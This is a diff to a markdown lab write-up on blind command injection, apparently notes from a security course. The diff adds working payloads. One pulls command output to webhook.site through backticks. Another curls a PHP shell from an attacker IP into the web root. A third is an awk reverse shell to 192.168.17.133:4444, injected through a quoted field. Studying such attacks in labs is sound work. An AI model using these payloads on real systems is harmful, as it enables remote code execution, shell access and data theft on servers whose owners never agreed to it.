@@ -211,14 +211,34 @@ but to know the bash path will run the command
 which/bash
 ```
 
-### Blind Injecion
+### Blind Injection
 
-It look's like a this is blind comman injection
+It look's like a this is blind command injection
 So will use Weekhook.site and will use back tick `` to run the command
 https://webhook.site/e0edf9f6-fb9d-4bda-9d7c-22fbf2a697c3?``
 
 ```
 https://webhook.site/e0edf9f6-fb9d-4bda-9d7c-22fbf2a697c3?`whoami`
+```
+
+
+```
+Command: https://tcm-sec.com && curl 192.168.17.133:8080/rev.php > /var/www/html/rev.php
+```
+
+
+>[!bug]  Don't forget to read the error msg carefully
+
+```
+10)^2))}';whoami;#
+```
+
+```
+10)^2))}';which php;#
+```
+
+```
+10)^2))}';/usr/bin/awk 'BEGIN {s = "/inet/tcp/0/192.168.17.133/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null;#
 ```
 
 
